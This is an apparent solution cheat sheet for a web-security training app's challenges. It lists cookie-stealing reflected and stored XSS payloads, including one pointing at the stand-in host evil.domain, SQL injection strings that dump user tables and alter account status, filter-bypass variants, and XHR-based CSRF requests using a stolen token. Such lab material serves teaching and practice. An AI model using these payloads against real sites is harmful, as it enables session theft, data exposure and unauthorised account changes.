# Solutions for the WebSec Challenges

This is a short cheat sheet for the challenge solutions.

## Normal Difficulty

### Reflective XSS:

*overview.php*

- Enter code in product search bar

```html
<script>alert(document.cookie);</script>
```

- Copy the displayed cookie from the alert box (with or without cookie name)

- Enter cookie in the new popup

- (optional) Trigger the popup manually by using the link (Do you want to enter the Challenge Cookie?) beneath the search field

### Stored XSS:

*product.php*


- Enter code in product comment field

```html
<script>alert("evil.domain/cookie.php?c=" + document.cookie);</script>
```

- Accept to steal the session of 'Elliot' by clicking OK

- Add 1 Banana Slicer to Elliot's shopping cart

### SQLi:

*friends.php*

- Find the necessary table name by reading the instructions and output the whole table to find the important field names

```SQL
'; SELECT * FROM users;--
```

- Enter The SQL code below in the user search bar to upgrade to premium status

```SQL
'; UPDATE users SET user_status = 'premium' WHERE username = '<username>';--
```

### CSRF:

*contact.php*

Here you have a total of three options:

1. Use the inspector to manipulate the product comment field to send a post request with the corresponding input field names to contact.php

2. Manipulate the product comment field with the JavaScript below and then post a comment with the message you want to send

```html
<script>
var frm = document.getElementById('CSRForm');
frm.action = "contact.php";
document.getElementById('challengeUsername').value="elliot";
document.getElementById('challengePost').name="userPost";
</script>
```

3. Send a post request via XHR with the code below from any input field on the site that is vulnerable to XSS attacks (product search and comments)

```html
<script>
const xhr = new XMLHttpRequest();
xhr.open("POST", "contact.php");
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("uname=elliot&userPost=pwned");
</script>
```

## HARD Difficulty

### Reflective XSS:

*overview.php*

- Enter code in product search bar

```html
<img src="" onerror=javascript:alert(document.cookie)>
```

- Copy the displayed cookie from the alert box (with or without cookie name)

- Enter cookie in the new popup

- (optional) Trigger the popup manually by using the link (Do you want to enter the Challenge Cookie?) beneath the search field


### Stored XSS:

*product.php*


- Enter code in product comment field

```html
<!-- NO space between the string and document.cookie -->
<img src="" onerror=javascript:confirm("evil.domain/cookie.php?c="+document.cookie)>
```

- Accept to steal the session of 'Elliot' by clicking OK

- Add 1 Banana Slicer to Elliot's shopping cart


### SQLi:

*friends.php*

- disable the `maxlength` attribute for the search field with the inspector

- Find the necessary table names by running the code below

```SQL
';SELECT * FROM sqlite_master;--
```

- Enter the SQL code in the user search bar below to update to premium status

```SQL
'; UPDATE premium_users SET status='premium' WHERE username='<username>';--
```

### CSRF:

- Get Elliot's CSRF token from the friends database

```SQL
'; SELECT * FROM users;--
```

Now, you have only 2 options left (since the product comment field is now better secured against XSS attacks):

1. Use the inspector to manipulate the product comment field to send a post request with the corresponding input field names to contact.php (including the token)

2. Send a post request via XHR with the code below from any input field on the site that is vulnerable to XSS attacks (product search and comments)

```html
<ScRiPt>
const xhr = new XMLHttpRequest();
xhr.open("POST", "contact.php");
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("uname=elliot&userPost=pwned&utoken=<token>");
</ScRiPt>
```